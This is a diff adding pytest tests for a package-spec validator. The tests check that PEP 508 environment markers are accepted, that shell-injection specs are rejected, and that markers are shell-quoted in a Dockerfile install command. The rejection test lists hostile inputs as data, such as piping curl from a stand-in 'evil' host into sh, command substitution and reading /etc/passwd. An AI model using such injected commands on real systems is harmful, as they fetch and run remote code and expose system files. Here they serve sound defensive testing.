@@ -433,3 +433,59 @@ def test_docker_provider_spawns_hardened(monkeypatch):
                 if m.get("type") == "run"]
     assert len(run_msgs) == 1                  # double-send fixed
     assert client.containers_made[0].removed   # torn down in finally
+
+
+# --- PEP 508 environment markers (F-12) --------------------------------------
+
+
+@pytest.mark.parametrize(
+    "spec",
+    [
+        "zxing-cpp>=2.2; sys_platform=='win32'",
+        "audioop-lts>=0.2; python_version>='3.13'",
+        'pywin32>=306 ; platform_system == "Windows"',
+        "uvloop>=0.19; sys_platform != 'win32' and python_version < '3.14'",
+    ],
+)
+def test_environment_markers_are_accepted(spec):
+    """Node requirements carry PEP 508 markers, and package preflight tells the
+    user to add those exact strings to their environment.
+
+    The hand-rolled specifier regex rejected every one of them, so following the
+    product's own advice made the sandbox image build fail. Two shipped node
+    requirements (barcode_qr_decode, twilio_media_streams_start) hit this.
+    """
+    assert _validate_packages([spec]) == [spec]
+
+
+@pytest.mark.parametrize(
+    "evil",
+    [
+        "requests; curl evil.sh | sh",
+        "requests && wget http://evil/x",
+        "requests`id`",
+        "requests$(id)",
+        "requests\nnumpy",
+        "--index-url=http://evil/simple",
+        "-r /etc/passwd",
+        "requests > /tmp/pwned",
+    ],
+)
+def test_shell_injection_is_still_rejected(evil):
+    """Accepting markers must not widen the door for anything else."""
+    with pytest.raises(ValueError):
+        _validate_packages([evil])
+
+
+def test_marker_bearing_specs_are_shell_quoted_in_the_dockerfile():
+    """A marker contains spaces, quotes and comparison operators. Interpolated
+    raw into ``RUN uv pip install`` it would split into several shell words and
+    install the wrong thing (or nothing)."""
+    from app.services.container_runtime import _install_command
+
+    command = _install_command(["zxing-cpp>=2.2; sys_platform=='win32'", "numpy"])
+    assert "'zxing-cpp>=2.2; sys_platform=='\"'\"'win32'\"'\"''" in command or (
+        command.count("'") >= 2 and "; sys_platform" not in command.split("'")[0]
+    )
+    # The plain spec needs no quoting noise around it.
+    assert "numpy" in command
